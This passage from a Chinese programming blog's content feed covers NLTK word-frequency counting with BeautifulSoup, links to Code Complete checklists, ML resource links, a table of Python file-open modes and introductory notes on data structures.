nltk.clean_html(html)</span></span><br><span class="line"><span class="comment"># NotImplementedError: To remove HTML markup, use BeautifulSoup’s get_text() function，</span></span><br><span class="line"><span class="comment"># 原因是BeautifulSoup在相同方面做出了更好的成果之后，nltk自己删除了相应的同类函数，</span></span><br><span class="line"><span class="comment"># 可以用BeautifulSoup中的相应函数进行替代，所以上图的代码可以改为</span></span><br><span class="line"><span class="comment">#!!!!!</span></span><br><span class="line"><span class="comment">#==================bs4的get_text================</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">tokens = [tok <span class="keyword">for</span> tok <span class="keyword">in</span> BeautifulSoup(html,<span class="string">'lxml'</span>).get_text().split()]</span><br><span class="line"><span class="comment"># ~~~~~~~~~~清理完毕~~~~~~~~~~~</span></span><br><span class="line">print(<span class="string">'Total num of tokens:'</span>,str(len(tokens)))</span><br><span class="line">print(tokens[:<span class="number">5</span>])</span><br><span class="line"><span class="comment">#['Welcome', 'to', 'Python.org', '&#123;', '"@context":']</span></span><br></pre></td></tr></table></figure><h3 id="清洗-词频统计-排序"><a href="#清洗-词频统计-排序" class="headerlink" title="清洗+词频统计+排序"></a>清洗+词频统计+排序</h3><p>注意字典取子集与字典排序。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HtmlText</span><span class="params">(url0)</span>:</span></span><br><span class="line">    html0 = requests.get(url).text</span><br><span class="line">    <span class="keyword">return</span> html0</span><br><span class="line">url = <span class="string">'http://python.org/'</span></span><br><span class="line">html = HtmlText(url)</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">tokens = [tok <span class="keyword">for</span> tok <span class="keyword">in</span> BeautifulSoup(html,<span class="string">'lxml'</span>).get_text().split()]</span><br><span class="line">freq_dis = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> tok <span class="keyword">in</span> tokens:</span><br><span class="line">    <span class="keyword">if</span> tok <span class="keyword">in</span> freq_dis:</span><br><span class="line">        freq_dis[tok] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        freq_dis[tok] = <span class="number">1</span></span><br><span class="line"><span class="comment">#!!!</span></span><br><span class="line"><span class="comment">#freq_dis.sort() #AttributeError:'dict' object has no attribute 'sort'</span></span><br><span class="line"><span class="comment">#!!!</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">sorted_freq_dis= sorted(freq_dis.items(), key=operator.itemgetter(<span class="number">1</span>),reverse=<span class="keyword">True</span>)</span><br><span class="line"><span class="comment">#========dict.items(),key=key=operator.itemgetter(1)【按第二列排序】，reverse=True【从大到小】</span></span><br><span class="line">print(<span class="string">'Total num of tokens:'</span>,str(len(sorted_freq_dis)))</span><br><span class="line">print(sorted_freq_dis[:<span class="number">5</span>])</span><br><span class="line"><span class="comment">#&gt;&gt;&gt;</span></span><br><span class="line"><span class="comment">#[('Python', 54), ('&gt;&gt;&gt;', 24), ('and', 22), ('to', 18), ('the', 15)]</span></span><br></pre></td></tr></table></figure></p><h3 id="nltk-词频-可视化"><a href="#nltk-词频-可视化" class="headerlink" title="nltk+词频+可视化"></a>nltk+词频+可视化</h3><p>nltk.FreqDist 返回class<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HtmlText</span><span class="params">(url0)</span>:</span></span><br><span class="line">    html0 = requests.get(url).text</span><br><span class="line">    <span class="keyword">return</span> html0</span><br><span class="line">url = <span class="string">'http://python.org/'</span></span><br><span class="line">html = HtmlText(url)</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">tokens = [tok <span class="keyword">for</span> tok <span class="keyword">in</span> BeautifulSoup(html,<span class="string">'lxml'</span>).get_text().split()]</span><br><span class="line"><span class="keyword">import</span> nltk</span><br><span class="line">freq_dis_nltk = nltk.FreqDist(tokens)</span><br><span class="line">print(freq_dis_nltk)</span><br><span class="line"><span class="comment">#&lt;FreqDist with 584 samples and 1069 outcomes&gt;</span></span><br><span class="line">print(type(freq_dis_nltk)) </span><br><span class="line"><span class="comment"># &lt;class 'nltk.probability.FreqDist'&gt;</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> freq_dis_nltk.items():</span><br><span class="line">    print(k,v)</span><br><span class="line">    <span class="comment">#遗留问题：为什么没降序排列</span></span><br><span class="line">freq_dis_nltk.plot(<span class="number">10</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6908911-5c1a13d8bdc6e418.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="停用词（未实现）"><a href="#停用词（未实现）" class="headerlink" title="停用词（未实现）"></a>停用词（未实现）</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;stopwords=[word.strip().lower() <span class="keyword">for</span> word <span class="keyword">in</span> open(<span class="string">"PATH/english.stop.</span></span><br><span class="line"><span class="string">txt"</span>)]</span><br><span class="line">&gt;&gt;&gt;clean_tokens=[tok <span class="keyword">for</span> tok <span class="keyword">in</span> tokens <span class="keyword">if</span> len(tok.lower())&gt;<span class="number">1</span> <span class="keyword">and</span> (tok.</span><br><span class="line">lower() <span class="keyword">not</span> <span class="keyword">in</span> stopwords)]</span><br><span class="line">&gt;&gt;&gt;Freq_dist_nltk=nltk.FreqDist(clean_tokens)</span><br><span class="line">&gt;&gt;&gt;Freq_dist_nltk.plot(<span class="number">50</span>, cumulative=<span class="keyword">False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ML </tag>
            
            <tag> NLTK </tag>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>核对表</title>
      <link href="/cs/%E6%A0%B8%E5%AF%B9%E8%A1%A8/"/>
      <url>/cs/%E6%A0%B8%E5%AF%B9%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>核对表一览。值得每年都通读几遍的清单。<br><a id="more"></a><br><a href="/核对表：需求">核对表：需求</a><br><a href="/核对表：架构">核对表：架构</a><br><a href="/核对表：前期准备">核对表：前期准备</a><br><a href="/核对表：主要的构建实践">核对表：主要的构建实践</a><br><a href="/核对表：软件构造中的设计">核对表：软件构造中的设计</a><br><a href="/核对表：类的质量">核对表：类的质量</a><br><a href="/核对表：高质量的子程序">核对表：高质量的子程序</a><br><a href="/核对表：防御式编程">核对表：防御式编程</a><br><a href="/核对表：伪代码编程过程">核对表：伪代码编程过程</a><br><a href="/核对表：使用数据的一般事项">核对表：使用数据的一般事项</a><br><a href="/核对表：变量命名">核对表：变量命名</a><br><a href="/核对表：基本数据类型">核对表：基本数据类型</a><br><a href="/核对表：使用不常见数据类型的注意事项">核对表：使用不常见数据类型的注意事项</a><br><a href="/核对表：组织直线型代码">核对表：组织直线型代码</a><br><a href="/核对表：使用条件语句">核对表：使用条件语句</a><br><a href="/核对表：循环">核对表：循环</a><br><a href="/核对表：不常见的控制结构">核对表：不常见的控制结构</a><br><a href="/核对表：表驱动法">核对表：表驱动法</a><br><a href="/核对表：控制结构相关事宜">核对表：控制结构相关事宜</a><br><a href="/核对表：质量保证计划">核对表：质量保证计划</a><br><a href="/核对表：有效的结对编程">核对表：有效的结对编程</a><br><a href="/核对表：有效的详查">核对表：有效的详查</a><br><a href="/核对表：测试用例">核对表：测试用例</a><br><a href="/核对表：关于调试的建议">核对表：关于调试的建议</a><br><a href="/核对表：重构的理由">核对表：重构的理由</a><br><a href="/核对表：重构总结">核对表：重构总结</a><br><a href="/核对表：安全的重构">核对表：安全的重构</a><br><a href="/核对表：代码调整策略">核对表：代码调整策略</a><br><a href="/核对表：代码调整方法">核对表：代码调整方法</a><br><a href="/核对表：配置管理">核对表：配置管理</a><br><a href="/核对表：集成">核对表：集成</a><br><a href="/核对表：编程工具">核对表：编程工具</a><br><a href="/核对表：布局">核对表：布局</a><br><a href="/核对表：自说明代码">核对表：自说明代码</a><br><a href="/核对表：好的注释技术">核对表：好的注释技术</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> mind </tag>
            
            <tag> 核对表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建</title>
      <link href="/cs/%E6%9E%84%E5%BB%BA/"/>
      <url>/cs/%E6%9E%84%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>构建百科<br><a id="more"></a><br>计划、设计、检查</p><p>构建(construction)<br>建筑工人(construction workers)<br>硬纸板(construction paper)</p><p>你一定知道“构建( construction)”一词在软件开发领域之外的含义。<br>构建就是“建筑工人( construction workers)”在建设一栋房屋、一所学校、乃至一座摩天大楼时所做的工作。<br>在你年轻时,可能也曾用“硬纸板( construction paper)”构建过什么东西。<br>按照一般的用法,“构建”是指建设的过程。<br>构建过程可能包含有计划、设计、检查工作的一些方面,但在多数时候,“构建”就是指创建事物过程中动手的那些部分。</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习网址资源</title>
      <link href="/cs/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BD%91%E5%9D%80%E8%B5%84%E6%BA%90/"/>
      <url>/cs/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BD%91%E5%9D%80%E8%B5%84%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>资源<br><a id="more"></a></p><h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><p>Anaconda或Canopy的Python发行版本身就具备了一些捆绑库，如SciPy、numpy、scikit等，它们可用于数据分析及其他与NLP相关领域的应用。</p><h2 id="优质教程"><a href="#优质教程" class="headerlink" title="优质教程"></a>优质教程</h2><p>《Google Python class》的参考资料：<a href="https://developers.google.com/edu/python" target="_blank" rel="noopener">https://developers.google.com/edu/python</a><br><a href="https://wiki.python.org/moin/BeginnersGuide。" target="_blank" rel="noopener">https://wiki.python.org/moin/BeginnersGuide。</a></p><h2 id="机器学习工具箱"><a href="#机器学习工具箱" class="headerlink" title="机器学习工具箱"></a>机器学习工具箱</h2><p><a href="http://www.wordle.net/advanced" target="_blank" rel="noopener">http://www.wordle.net/advanced</a>  词云。按频率得到词云图。是在大量非结构化文本中进行可视化处理的一种好方法。也是文本分析领域中相当流行的一种运用。</p><h2 id="官方网站"><a href="#官方网站" class="headerlink" title="官方网站"></a>官方网站</h2><p><a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a><br><a href="https://www.anaconda.com/" target="_blank" rel="noopener">https://www.anaconda.com/</a><br><a href="http://www.nltk.org/" target="_blank" rel="noopener">http://www.nltk.org/</a><br><a href="http://www.nltk.org/install.html" target="_blank" rel="noopener">http://www.nltk.org/install.html</a>  安装说明<br><a href="https://scikit-learn.org/stable/" target="_blank" rel="noopener">https://scikit-learn.org/stable/</a><br><a href="https://radimrehurek.com/" target="_blank" rel="noopener">https://radimrehurek.com/</a><br><a href="https://scrapy.org" target="_blank" rel="noopener">https://scrapy.org</a><br><a href="http://www.numpy.org/" target="_blank" rel="noopener">http://www.numpy.org/</a><br><a href="http://www.scipy.org/" target="_blank" rel="noopener">http://www.scipy.org/</a><br><a href="https://pandas.pydata.org/" target="_blank" rel="noopener">https://pandas.pydata.org/</a><br><a href="https://matplotlib.org/" target="_blank" rel="noopener">https://matplotlib.org/</a><br><a href="https://dev.twitter.com/overview/api/twitter-libraries" target="_blank" rel="noopener">https://dev.twitter.com/overview/api/twitter-libraries</a><br><a href="https://developers.facebook.com/" target="_blank" rel="noopener">https://developers.facebook.com/</a></p><h2 id="技术博客"><a href="#技术博客" class="headerlink" title="技术博客"></a>技术博客</h2><p>sujitpal.blogspot.com</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="PYTHON3添加的新特性："><a href="#PYTHON3添加的新特性：" class="headerlink" title="PYTHON3添加的新特性："></a>PYTHON3添加的新特性：</h2><p>如果你已经将项目迁移到Python 3.0+，那就务必参阅下面链接中的说明<br>    <a href="https://docs.python.org/3/whatsnew/3.4.html。" target="_blank" rel="noopener">https://docs.python.org/3/whatsnew/3.4.html。</a></p><h2 id="python版本差异"><a href="#python版本差异" class="headerlink" title="python版本差异"></a>python版本差异</h2><p>Python（建议是2.7版）、<br>GCC编译器<br>对于其他任意的开源系统来说，应该保守地选择一个更稳定的版本，而不是贸然跳到最新版本。<br>对于基于UNIX的系统，Python属于默认程序（无须任何设置）。而Windows用户则需要通过设置相关路径来使Python进入正常工作状态。</p><h2 id="确认某包是否被安装"><a href="#确认某包是否被安装" class="headerlink" title="确认某包是否被安装"></a>确认某包是否被安装</h2><p>import &lt;包名&gt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件读写权限</title>
      <link href="/cs/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90/"/>
      <url>/cs/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p>文件读写<br><a id="more"></a></p><h2 id="巧记"><a href="#巧记" class="headerlink" title="巧记"></a>巧记</h2><blockquote><p>+：双可<br>b：二进制<br>单个：只<br>r报错，w新建 （文件不存在时）</p></blockquote><h2 id="一览表"><a href="#一览表" class="headerlink" title="一览表"></a>一览表</h2><table><thead><tr><th></th><th>方式</th><th>权限</th><th>文件不存在</th><th>其他</th></tr></thead><tbody><tr><td>r</td><td></td><td>只读</td><td>报错</td><td></td></tr><tr><td>rb</td><td>二进制读</td><td>只读</td><td></td><td></td></tr><tr><td>w</td><td></td><td>只写</td><td>新建</td><td>文件内容只能是字符串</td></tr><tr><td>wb</td><td>二进制写</td><td>只写</td><td></td><td></td></tr><tr><td>a</td><td></td><td>追加文件，不可读</td><td></td><td></td></tr><tr><td>ab</td><td>二进制追加</td><td>追加文件，不可读</td><td></td><td></td></tr><tr><td>r+</td><td></td><td>可读可写</td><td>报错</td><td></td></tr><tr><td>rb+</td><td>二进制读写</td><td>可读可写</td><td>报错</td><td></td></tr><tr><td>w+</td><td></td><td>可读可写</td><td>新建</td><td></td></tr><tr><td>wb+</td><td>二进制读写</td><td>可读可写</td><td>新建</td><td></td></tr><tr><td>a+</td><td></td><td>追加文件，可读可写</td><td></td><td></td></tr><tr><td>ab+</td><td>二进制读写</td><td>追加文件，可读可写</td><td></td></tr></tbody></table><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readable())</span><br><span class="line">    print(f.writable())</span><br><span class="line"><span class="comment">#     False</span></span><br><span class="line"><span class="comment">#     True</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readable())</span><br><span class="line">    print(f.writable())</span><br><span class="line"><span class="comment">#     True</span></span><br><span class="line"><span class="comment">#     False</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,<span class="string">'r+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readable())</span><br><span class="line">    print(f.writable())</span><br><span class="line"><span class="comment">#     True</span></span><br><span class="line"><span class="comment">#     True</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,<span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readable())</span><br><span class="line">    print(f.writable())</span><br><span class="line"><span class="comment">#     False</span></span><br><span class="line"><span class="comment">#     True</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,<span class="string">'a+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readable())</span><br><span class="line">    print(f.writable())</span><br><span class="line"><span class="comment">#     True</span></span><br><span class="line"><span class="comment">#     True</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
            <tag> 编程基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构概览</title>
      <link href="/cs/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%A6%82%E8%A7%88/"/>
      <url>/cs/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%A6%82%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<p>数据结构导图<br><a id="more"></a><br>完整性、系统性、针对性<br>掌握问题的本质<br>解题：思路、方法、技巧、能力<br>分析、理解、领会</p><p>数据结构、计算机组成原理、操作系统和计算机网络</p><p>线性表、栈和队列、树、图<br>线性表：顺序存储结构、链式存储结构<br>特殊矩阵的压缩存储<br>二叉树、线索二叉树、二叉排序树、平衡二叉树、森林<br>定义和概念、基本操作、存储结构和实现、特殊、遍历方法、构造、应用、复杂度分析<br>算法：概念、比较、分析和应用<br>查找算法：顺序查找、折半查找法、B-树、散列表<br>排序算法：插入排序、气泡排序、简单选择排序、希尔排序、快速排序、堆排序、二路归并排序和基数排序</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
            <tag> mind </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构概述——感受编程之美</title>
      <link href="/cs/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/cs/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>数据结构体系<br><a id="more"></a></p><h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p>早期人们都把计算机理解为数值计算工具,就是感觉计算机当然是用来计算的,所以计算机解决问题,应该是先从具体问题中抽象出一个适当的数据模型,设计出个解此数据模型的算法,然后再编写程序,得到一个实际的软件。<br>可现实中,我们更多的不是解决数值计算的问题,而是需要一些更科学有效的手段(比如表、树和图等数据结构)的帮助,才能更好地处理问题。所以数据结构是门研究非数值计算的程序设计问题中的操作对象,以及它们之间的关系和操作等相关问题的学科<br>1968年,美国的高德纳( Donald E. Knuth)教授在其所写的《计算机程序设计艺术》第一卷《基本算法》中,较系统地阐述了数据的逻辑结构和存储结构及其操作,开创了数据结构的课程体系。同年,数据结构作为一门独立的课程,在计算机科学的学位课程中开始出现。也就是说,那之后计算机相关专业的学生开始接受《数据结构》的“折磨”—其实应该是享受才对。<br>之后,70年代初,出现了大型程序,软件也开始相对独立,结构程序设计成为程序设计方法学的主要内容,人们越来越重视“数据结构”,认为程序设计的实质是对确定的问题选择一种好的结构,加上设计一种好的算法。可见,数据结构在程序设计当中占据了重要的地位。</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-8dd32c84e607dd12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-aea8c6a097def30a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>数据:是描述客观事物的符号,是计算机中可以操作的对象,是能被计算机识别,并输入给计算机处理的符号集合。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>这里说的数据,其实就是符号,而且这些符号必须具备两个前提：可以输入到计算机中。能被计算机程序处理。</p><h3 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h3><p>对于整型、实型等数值类型,可以进行数值计算。<br>对于字符数据类型,就需要进行非数值的处理。<br>而声音、图像、视频等其实是可以通过编码的手段变成字符数据来处理的。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型:是指一组性质相同的值的集合及定义在此集合上的一些操作的总称。<br>数据类型是按照值的不同进行划分的。<br>在高级语言中,每个变量、常量和表达式都有各自的取值范围。类型就用来说明变量或表达式的取值范围和所能进行的操作。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>数据类型：整型、实型等数值类型,字符（文字数据）及声音、图像、视频等非数值类型。</p><h3 id="为什么有不同的数据类型"><a href="#为什么有不同的数据类型" class="headerlink" title="为什么有不同的数据类型"></a>为什么有不同的数据类型</h3><p>当年那些设计计算机语言的人,为什么会考虑到数据类型呢?</p><h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><p>在计算机中,内存也不是无限大的。<br>计算整型数字的加减乘除运算,不需要开辟很大的内存空间。<br>于是计算机的研究者们就考虑,要对数据进行分类,分出来多种数据类型。<br>比如,在C语言中变量声明inta,b,这就意味着,在给变量a和b赋值时不能超出int的取值范围,变量a和b之间的运算只能是int类型所允许的运算。</p><h4 id="底层语言与高级语言"><a href="#底层语言与高级语言" class="headerlink" title="底层语言与高级语言"></a>底层语言与高级语言</h4><p>因为不同的计算机有不同的硬件系统,这就要求程序语言最终通过编译器或解释器转换成底层语言,如汇编语言甚至是通过机器语言的数据类型来实现的。<br>实现1+2进行几次开关操作,这些操作是如何实现的。</p><h4 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h4><p>无论什么计算机、什么计算机语言,大都会面临着如整数运算、实数运算、字符运算等操作,我们可以考虑把它们都抽象出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">抽象与抽象特性</span><br><span class="line">抽象：是指抽取出事物具有的普遍性的本质。它是抽出问题的特征而忽略非本质的细节,是对具体事物的一个概括。</span><br><span class="line">    抽象是一种思考问题的方式,它隐藏了繁杂的细节,只保留实现目标所必需的信息。</span><br><span class="line">    一个抽象数据类型到底需要哪些操作,这就只能由设计者根据实际需要（情况）来定。</span><br><span class="line">抽象数据类型( Abstract Data Type,ADT):是指一个数学模型及定义在该模型上的一组操作。</span><br><span class="line">    一个抽象数据类型定义了:一个数据对象、数据对象中各数据元素之间的关系及对数据元素的操作。</span><br><span class="line">    我们对已有的数据类型进行抽象,就有了抽象数据类型。</span><br><span class="line">    抽象数据类型不仅仅指那些已经定义并实现的数据类型,还可以是计算机编程者在设计软件程序时自己定义的数据类型。</span><br><span class="line">抽象数据类型体现了程序设计中问题分解、抽象和信息隐藏的特性。</span><br><span class="line">    把实际生活中的问题分解为多个规模小且容易处理的问题,</span><br><span class="line">    然后建立一个计算机能处理的数据模型,</span><br><span class="line">    并把每个功能模块的实现细节作为一个独立的单元,</span><br><span class="line">    从而使具体实现过程隐藏起来。</span><br><span class="line">抽象数据类型的定义仅取决于它的一组逻辑特性,而与其在计算机内部如何表示和实现无关。</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6908911-4023d768ccc847ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/960" alt="数据抽象标准格式"></p><h2 id="数据对象"><a href="#数据对象" class="headerlink" title="数据对象"></a>数据对象</h2><p>数据对象:是性质相同的数据元素的集合,是数据的子集。<br>实际应用中,在不产生混淆的情况下,我们都将数据对象简称为数据。<br>性质相同<br>指数据元素具有相同的数据项：数量和类型。<br>比如,还是刚才的例子,人都有姓名、生日、性别等相同的数据项。</p><h3 id="数据元素（记录）"><a href="#数据元素（记录）" class="headerlink" title="数据元素（记录）"></a>数据元素（记录）</h3><p>数据元素：是组成数据的、有一定意义的基本单位,在计算机中通常作为整体处理。也被称为记录。<br>讨论问题时,数据元素才是数据结构中建立数据模型的着眼点。</p><h4 id="数据项"><a href="#数据项" class="headerlink" title="数据项"></a>数据项</h4><p>数据项:一个数据元素可以由若干个数据项组成。姓名、年龄、性别等数据项,具体有哪些数据项,要视你做的系统来决定。<br>数据项是数据不可分割的最小单位。<br>数据项是数据的最小单位。<br>把数据项定义为最小单位,是有助于更好地解决问题。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>结构是指各个组成部分相互搭配和排列的方式。在现实世界中,不同数据元素之间不是独立的,而是存在特定的关系,我们将这些关系称为结构。</p><h3 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h3><p>关系、结构、集合、组织形式。<br>数据结构：是相互之间存在一种或多种特定关系的数据元素的集合。<br>在计算机中,数据元素并不是孤立、杂乱无序的,而是具有内在联系的数据集合。<br>数据元素之间存在的一种或多种特定关系,也就是数据的组织形式。<br>为编写出一个“好”的程序,必须分析待处理对象的特性及各处理对象之间存在的关系。</p><h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><p>逻辑结构：是指数据对象中数据元素之间的相互关系。</p><ul><li>集合结构：集合结构中的数据元素除了同属于一个集合外,它们之间没有其他关系。各个数据元素是“平等”的,它们的共同属性是“同属于一个集合”。数据结构中的集合关系就类似于数学中的集合。</li><li>线性结构：数据元素之间是一对一的关系。如不转车的地铁站。</li><li>树形结构：数据元素之间是一对多的关系。</li><li>图形结构：数据元素之间是多对多的关系。<h4 id="物理结构"><a href="#物理结构" class="headerlink" title="物理结构"></a>物理结构</h4>物理结构：是指数据的逻辑结构在计算机中的存储形式数据是数据元素的集合。如何把数据元素存储到计算机的存储器中。如何存储数据元素之间的逻辑关系,是实现物理结构的重点和难点。<br>存储器主要是针对内存而言的,像硬盘、软盘、光盘等外部存储器的数据组织通常用文件结构来描述。</li><li>顺序存储结构<blockquote><p>顺序存储结构:是把数据元素存放在地址连续的存储单元里,其数据间的逻辑关系和物理关系是一致的。<br>说白了,就是排队占位。大家都按顺序排好,每个人占一小段空间,大家谁也别插谁的队。数组就是这样的顺序存储结构。<br>当你告诉计算机,你要建立一个有9个整型数据的数组时,计算机就在内存中找了片空地,按照一个整型所占位置的大小乘以9,开辟一段连续的空间,于是第一个数组数据就放在第一个位置,第二个数据放在第二个,这样依次摆放。  </p></blockquote></li><li>链式存储结构<blockquote><p>插队，添加，去掉，整个结构时刻都处于变化中。顺序存储是不科学的。<br>链式存储结构：是把数据元素存放在任意的存储单元里，这组存储单元可以是连续的，也可以是不连续的。<br>数据元素的存储关系并不能反映其逻辑关系，因此需要用一个指针存放数据元素的地址，这样通过地址就可以找到相关联数据元素的位置。<br>链式存储就灵活多了,数据存在哪里不重要,只要有一个指针存放了相应的地址就能找到它了。</p></blockquote><h2 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h2>我们在用示意图表示数据的逻辑结构时,要注意两点：<br>节点：将每一个数据元素看做一个结点,用圆圈表示。<br>连线：元素之间的逻辑关系用结点之间的连线表示,如果这个关系是有方向的,那么用带箭头的连线表示。</li></ul><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>各个计算机,不管是大型机、小型机、PC、平板电脑、PDA,甚至智能手机</p><h2 id="数据结构-2"><a href="#数据结构-2" class="headerlink" 